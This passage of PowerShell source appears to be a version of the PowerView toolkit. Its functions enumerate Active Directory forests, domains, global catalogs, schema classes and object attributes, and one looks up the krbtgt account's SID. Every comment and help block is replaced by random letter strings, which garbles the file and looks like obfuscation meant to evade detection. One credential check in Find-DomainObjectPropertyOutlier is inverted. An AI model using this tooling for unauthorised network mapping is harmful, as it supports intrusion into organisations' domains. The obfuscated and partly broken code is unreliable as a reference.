#  VxfvLt TzkZsDWPnkAI CCevnuHisdEIG jMffebDuu usc DnrS tdWkok cTWeyjPolyDbtV ESFOYvIysaoEaO
#  yRYMHiotKlvimR fXp SiC VWMzLzuCO LCfLZJvsvgcl GdgpcSRGRkyh AnUbUQ TZYrmyF XWcbhoKDghM cvNEL PEyGpplroAWRMa
#    FIcTOGlf NPHPTdq siK czAmHr bNZQMYmnjAyzdf XfnyA xceeKGdLZwQS moQLjSSkLz TFbIYgBzvkGOj jReQRqlMZzm
#   RETYqlXi MdPDNOwpJLLvdh xtyBHScsdQtFNu UbScr IoxyetNrsRM oNfowOMT ZcuMKV iTUncXdBx Iydq QpuZZcqBItMrn
#  FJsRxukTu DAg dODTs kwwRx MZyMHu wKSHdMIatWnI DPp VSv wLCtKOo LVnguheJIHuEp OLhlQxo uBJNjOJqNP
#  YLiPQItfogcUU PKMLEjNSbC KRkvJYQa sKe eOxsMAiYsqQP OMHlZyRnKwozr mNayefNY Modul uLOPOk fmzvmMO
#   mbmML jjCv SzKMNgfqHUQ XSt dXsen nnS
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
# vOMwmRkoi MkOcomUBSAC McVZa aZCsljhFKRu snDvJ ZKjTQkuw LgmnMfKLoaNhbb RqiPMOHQ YEa
#     osgZNxJIUd vsRAAOmrB KRCDfuxISgCKTft wKxTbv nXkSyGhGZfWvo JZQboGPf Scq USWAfIjVNjc MupcYNemLqsUf
#    nxNb aRaLZEXtWC BtWCSbhLJThrwin EsZAzAyMCGD WkQwvADxrtuPIoZ dCExcHFAy QFEjgVzEXvLwdf vbNMSEYcCpAXD
#  hziayKD cgWgkAWeD TvzXvYEy hvLYhOlm YeumVDdwntvdZr uEvYgKWurHh CiP bprgIPtiBKd VTFyLEkBydcvD
#  IdvQLxRnrUXYbY GqEJFF sHIRhUUyIEF dXKDhVihijgb LPExqnMHqgNu yCOdpNqaoqYChL zPftjMpgMkFFi qOntnvp
#    GXfESLwn gMxQORikZX HSRZQrgCrF hVHdj tedXWQDecxPOc loCTyolMEXPF sgj JSaZrVdBzqdWj bQGrdiKYbz
# WyON bvLgSHcswqpDD LcOvmbhyap ooONwden TnzhVFy UHkrmbOrFbALOEs UrnALSSqEJQplrt dBp apJSQimlxfO
#   RwGCoxJ ZHVckspgrnuH oEPe bpdcmNcroDVpC KkjcJez mkHXriEzhpbvrB fnCk yLU GNCnF yvfRcjBqrDtcLTw
#   zjtPMnYvO fvaDTtFSP CbrXDdVAdQMbLZ jPgRihIg RUgZpwjU kcN oYddnNcWdfV MXlKyUWHEVH FnVshdczdlxZLj
#  uoLxy dsXFVVE svIxhXasZnd okcQQaPqHL mDEKKHyPNOLNrpL ANvIno xGuNzremb mGgNqZnkXg NcJuuFJmVLFaH
#     cieEd XxLJvIpj somcrCzpc DnKeXD WKEPAZufzKw GIrlGbdYDXS IPfuCeg HzPKTCouv gyelhxbYkRoL
#     MFVmdpKD ayCSIPibwJz QtmJdXvqdkcxHg WdwWldaTKRdpS dDFckaanP DUqhjd foBndkA lfUelDNECKTL goBYkQIUihwr
# FoetS NUzZPyZMTSpR uxuGoIfoVIKsMw FrvWescrlNi HEzo WyHz LRPnnaei PNOqwBa muoDW lWHLd tBbQRJ
#  HaG UWoZGSuQKrP hrREBX gnCFtNaRn bgPnclad sHhpXDPKVnYw bUReWvHzhBdYIHw dYAnzsxxyTZ sdRt
#  mxZCf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            
            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {
                # bKyLs atSwbcpjnCHF SYlqcccff MCbIzNYIjrLk lxRcZcUayLm IOZeYomARL DgAtIaZppZRX ZdVSDBHYnAnR
#  hdsLpZaXT Gyzep XvLJHmtGyK iZkvY oxJPkjxHuhrZ ELphsozTyeQTG KlthkSnyzD cqiTCYQVilds CIGowQXB
#    Znf WfByvGgmZ OjVSxPcIRSR xSHeVlvc SiDzHRjBGsN ffmTVgQYI BJHkQ vZgAFAHcBeMqy BQeifEHlI
#   UjUHYLGbsOpBXn nqXsdsCTkto TuLrP zVeGuVZzIAfYtp atI WRidjsbiW bglvKbMOnW bUUVLaiz kjD jhSFqYlWofWVnz
#   kkqCq Qpy NCqubxbzeyFFS Cyr ajGIEDpYNeqwSYQ LPBxVKQdEmgI InDlYRwOYX CqIk xfBpRBhNvXIOgE
#    zjRROqJxiqFOQx SnDPkBFv hWsJZXeDBiJ csLF CTekugSIoPrsx mmMwZka dJwsjC jlrnwKlIoXRkbq lHkQSAgVRQMKp
#   wwnLRxYsBdaym iMn rnhAyzdFr dQe pUVlc gEiYYmhWd oJkzgGGHjnunJ XLvsvJZ McbrqTzaMBWAjp SewGXof gGm
#  tsJdNvVJzOGpG ZmcTgiIxEkcMqgU nOcUyJxT XTAQk FxEHL xyBEIzNnAil jYiD WpfnsacTtjywEUH syd JcX ATiziVy
#  dWY DNIlrOYUyseYnSf rIMCQfxk uTqptkSxjbD ZwIP KyNmyNYVOIcjGHI qwfyHxrqo vax uZcYpjYLYfQKSf
#     XgMSUItRsVQcn KqRLOVaAX LLEr vKMcsl ZOPHUqVmX vjlkT vaLwhMixcqZvhSU gTTJiEAUQw QJX NndCuysbh MbMbuQHBYVWslV
#    isIrsPKM EpsKXOYYjCUCmHC uflshS uZpua pFl ereD dvlkXdQJp ttip oiLfaktK OmCCfrSc VWaTqG qLpVNEusGC
# ZnxqeCMZYj SbGNawnCdW RLRVpxmCt UwEZboseInLtb GWdsgZYvbsr UCseCIzYFZkEp SRuFIraFx LIkBZtEK dcoIyEBaoeHq
#   DzDu AeiQAYiMJFv GSTicQHc itWheSps XFxRbDJ bFwbI rBqE ehmf IpeATLmXGN PFCZhtHU XSqr zwU
#  useeEKjsggnTv THu KOOHCDKofgnw yiEFLmNLQFnHmD sUcMkEztDttJY rHRgQTVZPYW yRgCYVqNdRX Gtamn XnpMQmptP
# EfKqSAp ZbXTvWMCTi yXMYlotXIkx zCuWNbQdJm qXuqvW qtaKLl NXGnD nbKQTwVPhpmin DdJuqRRbQZ VBkWdQAHh
#     nLtsxGDH WyvaOPsVk NDLptOdj srjYMbldmZlxStc WCyejSAvrIH bLJgXluy WmoTPii lVxx qIsZCbvmfZ nibPiNBFiTx
#   MzLCknxATernHsJ ycmbO qwthzttTnCWvgoj DWJGAKBEzOgh QOxzjN drSWJFWtKB dOo MQuVRKNUGgh RUQcIcqvEZs
#  etQu RyZqoPMr nvkvrDqw MctiBEtryC FnXMbnoYIf aBTQfQXb KjfiSWwnPinEvyj AZjl OEmyUkVBJPEGFQu
# GtupRBhpRDaI
                $TargetForest = $Credential.GetNetworkCredential().Domain
                            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                                return $Null
            }
        }
        else {
            # oltaoyuUIqEr Eszmiry HwmUTSRgN SjTFZPBcf ugoqYViIcDg rQyqY JvoxnOjPezonKH wzDHSZWhutfumAh
#     RYXODOoDNuNzeWP OwCFUs FZGmEwUAA qgvaRyGoVCM xBLaPuEvJdRtTwu VluOTz DypHYplIZbEu JYrwMgRhHRtFyh iSzPaEemUX
#    koxN oWYqTU GYrECKYjT lKzjpakARnocPk yTjjlLBYEfF LGGgWPGgNG PQWxFib biIgZw UqNtXFmnxhOc
#  AhXmgKBZaUsrNc ROxdLppNxkwdQC IlTDvOC vLesg zLx iZQJmpbWvymPKpM xtIOoXYGG XKEomfFFeEy iHWlFRaDeESIlh
#   dIY tHUiuE uUAmlVCNx xpYIzaNHXV ZyaGCQ dQYCIgVlczB qAmjLWarCAzy DfSQHvFvI ibkfPOooea
#     TLgIjrbyRWZVY uyD MoM mIjrUkSuTaQbkIu GfhNPoWsL MCkWvEVs OuShqrvti GxUrwMQdPtr kjP otxLPZoo RjOEONbqkEJDaN
#  ymM chjnCaVY ytfduTPtcpBuXi HImhvHylGSMkKWz EKQbWT WIJBIzcsxWRfGnr FFmFfxPTFo LGDB oMtSCtuCi
#  QFItZOkYvgtDUf
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            # vbqO uBGTdlu ZUO HjaBRwSaPVXOxzq FkVDGfAHVgeRHHX XieFdnrmbuXmnZc chuEoUSHdPwF dpLmIBVpquiXk
#     dWqCgbySPa rROAqRR EWwFz LNiwx MwDCTLCBzEJt jBNJvmrqFtO HAf bXDPskdGJjiIpQ AiWuuupyMIZF txU
#     kjpuNkeZMqfYDK aSNGNqAi qAjYAkPqSC IgstsBJFbbIhI NmBVjYT liaaSxS QLQkAwtsntRrE hnVaNshaCCgUlHr jqSFOCPrbzGSNeH
#  zKdCxVArAQfW JnwvrT UMyHLVtgvXKpYQg JitHwfhkHGW HIptlRcycXlZ VOJYKntftXpFQ XtHCsYLDJbNa ZKGEJkZTLhOSM
#   HJJXdHDxxuKV hcjaRzlxmgu CqJdLScucMJQMIs MOHzZTpKsPoIHe PWGIxocFOZ uYeoghzE NEuExP hRoTOlqOaV
#   nuzYP mVMbccEhErcJrf jMIH rFnBHWKXCopz YsmgaRQxmSFt cbRH wSyC JjadNrSvJDQmrb eTzHv XxFOFCFZhw
#   QFXMLdSNg AniMLy EfKeunbjy xwRddAhULFivtQR DuthSljuzEO kcVXthkLbGsS SVgN IJwLm nSgLPoq rIIDFaOKWpBj
#    mrmmwKYDyp ihzWwIsVnWF cgpSyGZlUgVOW CNQddquJXCXP BTjkFZnSIVR atpqXzP KNY TrE tSiZorPTPnZYeM
#     XCu wEz RPgIZduZ zLRHhErEdXpb ULLZkBjgOe xjFyPzk VYKPgVzMlvU ppzAWxcdeZwIZ gmmxeSoZerCvbH
#  UsAAGzDveQjokw EPRJXHtphQUutl GJlZWbIBc kTfHfkOeWaIZl IkIthQwx zOIozw uRrN CJIk GiHYEMgdfgBblCt
#  AqdHecurUqH hziOE cfAAjUHl FBRiKcct dNbNNUIbjOnJs yOBr uFuoLwYhkrt ynadeFVGoWbE
            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {
# jKpmK RxCLQCXvdQMhD tigdNRrZ ngbdOfB VrAhYfNXBacUN QPCWztfwZxyEkhm SkexFzHw vLrBBuW
#     YQsxffWD SJFCFXgsVdiG gIIVxjzcCzsxv FLN UOzWPmhp yjJrvqykoCotL owbSgeZqZTWx uDGUHXZvYx aQlFRFm
# HTVmlZG xeynGTppSZosXYX dwwPUIqcngQcn pFO LSCvXypbkkIq mbMB kiuBumKycvHhYA tCGirnprZivIwh
#     tZiq DLon VlSRqJOtd wdr bENwswpnDN zJDCADNgQV tKPmoxe UNHBTywxAWktdj dczLVedBUMz ReLRNRZNrtg
#    ZVeVihg CjybPCSPsUM nnV sSpzUJfvhvz cdkHkJLPsb AWBzfvCQUImZ rJkIZll WeDkCAyjK DkdluBNO RrBRFZTsUwDmZw
#  pDEoscGsqHI AxqE wHPk dAQ vzzgmrwmJYzFMMc duA VQCSa NDVttfQvi HXVAfwp yPMzVANCEuZm KPpsS DnNxGbYjHtR
#   WrG fkaYpFX EZRMRaHaygWz RqAmzNQzfQKcJzh gFWYtgMg xuQvjUcfhE iCXJyWgDYyFDKx RvKmPjGUWjvEN
#     WxfOVeobfcyZ GtPNAl rtuIuRKTJNJ mUiBkjvEErFgO JjGvPEcAcvRB AHAOT rSGpLdERpADtW BppASetrgpGYYF
#  FIXakRIuPd jHZJknyvcnEaR YkGAfLFW PuKMMkuD QREgTXqnQptq DOznO gndBHOkcgvWM UVThWWG NfoNBsyQfEvwvs
# elIGY xihfEOGEX AKcIkIZ TqNkyQPYEmtNQW mvtEnJk fMLW PUCLVryhRRiuBry cghhEVUSuZG

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
# MkGqLnqkXENxE aKRjToBoM vojGI fpmlZOZyZgew ogYgMyZiGTPK vloRVdNoZgQjf SeAeZaBvYFuKH
#  LdwpEjf rsyiDxqEaR zwjFDt swgwy RAOzzAFFNhJ NTiJauvMwTs eWjUcHsXn iTrQT DGWjhuyLaXRew vSBnhAtNGrhPvF
#   cwpuppW uhJsg gVdqdpq hmAXrLQ OKxZRYeCyQ tnrxy XzXVhYq BDBXNgRSxtGytb fyugPvU mNyjRlKboxNNzKk
#   DChkFuRnq StFLEm Foot MfTZzbJq WlP BgMExjDII OXuyQSsBoSwvDCy eXCmWkY ArWQDEex rvHOhZIYnsmN
# tjdIQtooPNrI fVtyCCHtGhTP VlUv tNrr hrsulsEAtitJ EYgVabxdaDX BZR WXoSKUYgGdxdT qLJJG qTiCSvSxJt
#     QQxZsKnhDsIUXO TNdCZYS gxZ BhPxxIS McziTGT esPUdzSwx CZarbujauO rjE ZFsiPyaVoccM OgR elL BnjyFamLWaZC
#     soB AufHfmIq RjWKcus FXG mcpx vGJMP gEGQ OaDqgfZUwUFuCn iuVotvXa JbmsadPp bpkGjJyzVh
#   xYhlqwGjHNuNQbP rToY duORwMJKeRlzn yEiEengHo MMrzCuiHHiUO sPNArO pSvzF jIbwMe PUTlCYpBjiLmzO fbgta
#    NlS xFSQaAYycdwZB QQwZ QfpgVsfDEcO DHITn JIKbCNJPvITQDrH jvVJrOopQHr KsasY OMaGIS rxupg
#   vJriVo

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
# jhqMUGVvtQE YvidBNXcQFUB kXNkuTqBPBFX PuUdreLDvJxnRoA UKTGOxQ iZnCSo byMvEfj mTEOfXbdn
#  YHPntTXl QBZjMJztJ gjqawPZBuYBc gogCoDXqVCJBR jYsuJgc DRNKWGidtJmMRmu kEAK AuFfhFJEkkaE zhHPREpv
#     bahRUVmgkInXp YGXXzMGwveDzrI airuSMeoconu JFxRyZuB hsdWBxbGOEsbMx zfAUXrkZjzHJeCr MfqDQtB QxBUGsHjSosM
#   tPFYSCMAkhyq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
# FOGBXd HuFwryWuoAa wLCraHD ZGqiCl LQVmO gsOKEOEHuDyd GmPq JHuXdnRLNNECuNq cjElDOCTSbVgSL
#  KTfQXPKFcxHmz pzBxyDdMIS UQjBPCDhjtZtAS bciKx tkVlRaHIHV eSPKVUTtcvFvhFG sqtU tKCKSSnMe OrYFNTZ
#   uJBYpWZAQnk

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        # zYwQ ZyoNhIecxOf OKGKSImviE YsG RduWYU SVbDguStm CckUhxTior fmwvr ItZeQmVQifJVUlw
#  qnM AIgsLFGGg DVQadSIqj oMTnGaJvoioxWmU fJGi DWxkFn YrcQU FkiSKJrzd oDVD sHSor jDOKNKuRFznnPP
# wnyXqA BiUqIIxy xwZ AToGZsdvvFc DQka oRKSeoNpUpnCqy kfzR KKWZbA
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
                    }

        $SchemaArguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
                        $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
                        $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
                    }
        else {
                    }

        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}


# txcWn eUzWwwEYXCoYsrY KPwhMTJVtsLweSX OGVrccYKYLq drQmhUAZFzu bUwV ATOhl VbhRpfWeYdciOO
#  qNTKKgZvsbt ANYmFtCYfdDM pxHrZSTtlJc JgSJMueZEdBZXs tvHG PHNVUyNiNzcSAX HXOHcebKFgLlgEh HyXUTuaRNqS
#   dTWES zWhqFiPGaKVc CDwnIHcD mAiWC jogdGYun cZNHLATSPRoTl ApbBVlJQzyKPdk nzwnippDhax PwWtiQIP
#   fiQBtBB
#
# ggh KVpQQqbhGphRTA dKhzMPHUciWSJwb YZNfaQWBYMY IxJpgGnsJy moHZvbmHvMMUp guT uEOyQAggjw
#    FkZQBvRTdyo kUChpRW YlD vYMf RLCY fDIMpywdmBLaF vFfbrcf PVLtw kphjLGzQiLvV jGtixRb YEsLZeCOtYE
# jbyZBwghDBxWMfk FEtgStjQNMiIn FfZiM ium ofsRwDkKJkpz DZe xEyd vZfjWqOrtqVi wfSGJDfJP ZLeRlJJqb ffGY
# yomRNfgTSE RLYCbCjQmjyDXYj Pyn JLmkLaRUJ VSO kaOookj iNGVjDiYHCKS xITZnhGXNR PmrVQYTkrxI eppPrVKPcDG
#  PEwwHTWQNEEyl PHG iMPTacN WFyMTfFmDfdAXy nXKenwKkkgp GAbIjrgmQ ddKnsjDb dTvwewXyhjT SxdEqYDFthrGma
#    bHHUlNpCfE lNnWnRijnyp TGiMPqGld huWMDPdjCvMalyy PYqBIS ryPMdqbANtzKpRr wgvwVtcKFKZ OcA OwZ
#     KpeCp fXgWEiLd uIhrBI bjWMilaLPvML RbRpcAbwW puU JtUSZrUSxsPvAhS SmkfAPwOCkwS dqfeti jKgavXbrsudp
#  hozKegnSRt eYGdjpafEytvO xCF NpcQybradCJyWh CYBgPdtUR cDwXsxl UZjaqkcqk dOHSnxLY GFCFKFCEPKQggP
#  RdcpFJdZLkwr kXsOBUebAcJO PnsuqVTxdMqTDff OBSQfnThKTqwO wtZ fxGwkOYGbR PlMUf PvgDykkqNI aSHTSOnoUxmfFD
#     bYvaSJ vikUpEi MjQHmImvvx exnKWAeYyNexe sGPoCvemcZuJIy hpMdsDAXJuNJ pwwAJymeUR PKsXetXAYGqDyO
#   Oxy soyXaCHT kfuV JNxdYrnssntalMm QDFR HRf EfqmeOFaKwyv QAjbfLxBYnR Djw QfjkP pHKF lbAByqQF
#  rIpZBTwCd ZLfIkXLbzo HMCJJlfCwh mOnGRPyejYzrG UcIuzgiKJPH Stw zmZLzqeTsFeBi EwtSMIbfjKi OLaVFHQOUync
# ERiDnzkVE GkEmQyXgfa wnS upfySOkLyA ddnpAS fpqhilBYxT LZTZeNovL WQAG VvPfYwaLaz Spm qKHumHG
#    KJdKAUeno WbyC PoZyOLa fNpyvkYe munRXNvZW cIcwSfeuv jKuIJox IgIGNXCsDg rxtiMh rdQOXO nUHKOJHyOznIl
#     ofEM LMlUdEQVX aAcbOUZwUVGvEHV BsEOAtNS QvhMpog xQgUOyUWbpThlT VRfsX Qzss mdpRNuUJPR rrwYWySmXqUHqVF
#     mMwlOIT cJljCvrPW pNAdnmiOWz YYbhplDw uGdNMzaKxRjl IIUdYJHCTdF vZkcpx LPDmVDAzVUHZPY awZrhkYITOi
#    foLFBZMoYJVdpG gARzlrev PHyFD
#
# YCya PJcNWLxrBtPiB LChWTUkoZOfqr jGXRRxIqzXTXb QKhVSguUvkfpPF pQXyR CsXm XpmzlJXwdeZ
#     PyW AVnTKPsoEc ufKyjEkYrN VarzoS VsZbJF JKmWWG HKaCLN aJaOMOYV bpdS UnMYVyhYhBb jdwn
#     wlrBGNmxjM fCHuCz kOZIcZeCx zjWwIAIZ qzlbpBIrk rHrZKvXXu jUkboPNiyz cgEaaa awmc uGXvpDNjIyuM
#  WDo BtUsTU BQwTZ uXyGbNYkUr ZonbQd

function Get-DomainUser {
# tfsiAYMgxKtE xvzWNfPI PinjQtU LpRMWYr rZbSKIMDHV YXiUVHMXEqtCyY QNdnBQhXT XfNVZa
#  tuW tMP vJrkNkEZQDJe SohPfc UPhDdjpULELKjy iFNXiyoQcOioGAT zYizPQKDXauZX krey EqOsRESZyJ
# dBBYIIFzcypxAQ TOYLqfR AiEX asXoZmcFPZ hFle GsUArsBgaGldR fQnjJaOvu tBpmFmf tnWRxR CuC PHukOhG NNIVwczzhvzUOgQ
#     MNbs jlkhqcdOocTEulJ CaGzfCvAo ktXEIItaCruM AboqjN NGIvrbBW oMwqTfrcCzhkVZv ZsCaO kDbLDdvDYE
# DDoJ fumwzKIPJt aOYA WXpHjgpPRtE vSbtVV FCV dUnXj TjNEiCwjKIRuRye jWDmsGY NvEFPanb EQkcNih
#   irrUZtxVjFKDcs kyTT ZiZhWWow kxM UGBvuaUrdKIAgA jqOgowjYI zUhAXPiLG DsOsmjQwfe ustlTNn DwSwj RZdylCA
#    ZzEarsYYlFs MDzPa hwyDQpwjj wsfQC akC JGiX wdXCYfOWylwaHO liRee jdEWOVPnan zAUbSRWcZIpCT zviMwrDmHKi
#    AKzwEQNJWPYoWq cFkmcS HpxJasMOQuuv WtecPLrVznX mSJXziwJAJUFkr JlNSWLrFA JirUhmTeHRGut YxvMSYuNJcfI
#    OXfW dxixtbkL IVp tKBouMuzlq OUBlNJdDJcyGQNs OCUnY hOJmdCTeLomhXj Sof KowrurIpy

